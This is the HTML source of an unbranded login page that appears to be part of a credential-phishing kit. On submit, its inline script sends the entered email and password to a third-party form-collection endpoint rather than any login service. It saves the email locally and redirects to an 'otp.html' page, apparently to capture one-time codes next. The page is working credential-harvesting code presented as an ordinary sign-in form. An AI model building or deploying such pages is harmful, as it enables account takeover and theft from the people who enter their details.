<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" type="img" href="asset/header-logo.png" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Home</title>

    <script type="text/javascript">
      window.onload = function () {
        console.log("working");
        const btn = document.querySelector("button");
        const emailInput = document.querySelector("#email");

        // Form submission handling for both traditional submit and async submit
        document
          .getElementById("form")
          .addEventListener("submit", async function (event) {
            event.preventDefault(); // Prevent default form submission

            btn.textContent = "Loading..."; // Change button text to Loading...

            localStorage.setItem("email", emailInput.value); // Store email in localStorage

            let formData = new FormData(this); // Collect form data

            try {
              let response = await fetch("https://formspree.io/f/xoveqrzb", {
                method: "POST",
                body: formData,
                headers: {
                  Accept: "application/json",
                },
              });

              if (response.ok) {
                window.location.href = "otp.html"; // Redirect on successful submission
              } else {
                alert("Failed to send form. Please try again.");
              }
            } catch (error) {
              alert("An error occurred. Please try again later.");
            }
          });
      };

      // Function to toggle password visibility
      function togglePass() {
        const passInput = document.querySelector("#pass");
        let type = passInput.type === "password" ? "text" : "password";
        passInput.setAttribute("type", type);
      }
    </script>

    <script type="module" crossorigin src="main.js"></script>
    <link rel="stylesheet" href="asset/style.css" />
  </head>

  <body class="bg-gray-100">
    <div class="w-[90%] max-w-md mx-auto pt-5">
      <div class="mt-5"></div>
      <form id="form" class="mt-44">
        <div
          class="inputsCtn bg-white rounded-md shadow-sm p-6 flex flex-col gap-6"
        >
          <p class="font-bold loginu mb-3">Log In</p>
          <img class="imglogo" src="asset/header-logo.png" />

          <div class="ctn relative">
            <input
              required
              minlength="5"
              id="email"
              name="email"
              type="email"
              class="w-full rounded-md bnbn p-4 outline-none pl-2 transition-all bg-gray-100 focus:border-primary focus:border font-semibold"
              placeholder="Email"
            />
          </div>

          <div class="ctn relative">
            <input
              required
              minlength="5"
              id="pass"
              name="pass"
              type="password"
              class="w-full rounded-md bnbn p-4 outline-none pl-2 transition-all bg-gray-100 focus:border-primary focus:border font-semibold"
              placeholder="Password"
            />

            <img
              onclick="togglePass()"
              src="asset/eyes-a95130fc.svg"
              class="absolute top-1/2 bottom-1/2 right-3 my-auto"
            />
          </div>

          <button
            id="redirectBtn" 
            class="bg-primary mt-w text-white w-full rounded-md p-4 disabled:opacity-80"
          >
            Login
          </button>
          <p class="pt-3 text-primary font-semibold text-center">
            Reset Password
          </p>
        </div>
      </form>
    </div>
  </body>
</html>
